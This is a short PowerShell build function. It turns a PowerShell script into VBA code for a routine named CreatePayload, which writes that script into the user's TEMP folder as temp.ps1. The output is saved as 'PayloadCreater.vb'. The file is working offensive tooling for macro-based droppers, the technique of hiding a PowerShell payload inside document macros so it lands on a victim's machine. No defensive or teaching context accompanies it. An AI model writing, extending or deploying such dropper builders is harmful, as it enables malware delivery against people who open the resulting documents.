function Build-Vba {
    param (
        [string]$sourceFilename = "main.ps1",
        [string]$temporaryFilename = "\temp.ps1"
    )
    
    [string[]]$codeList = Get-Content $sourceFilename
    [string]$Code = ""
    $codelistBeforePrint = @(
        "Static Sub CreatePayload()"
        "`tDim s"
        "`tDim n"
        "`ts = Environ(`"TEMP`") + `"" + $temporaryFilename + "`""
        "`tn = FreeFile"
        "`tOpen s For Output As #n"
    )
    $codelistAfterPrint = @(
        "`tClose #n"
        "End Sub"
    )

    for ($i = 0; $i -lt $codeList.Count; $i++) {
        $codeList[$i] = ("`tPrint #n, `"" + ($codeList[$i] -replace "`"", "`"`"") + "`"")
    }
        
    $codeList = $codelistBeforePrint + $codeList + $codelistAfterPrint
        
    foreach ($item in $codelist) {
        $Code += $item + "`n"
    }
    $Code | Out-File -FilePath "bin/Classes/PayloadCreater.vb"
}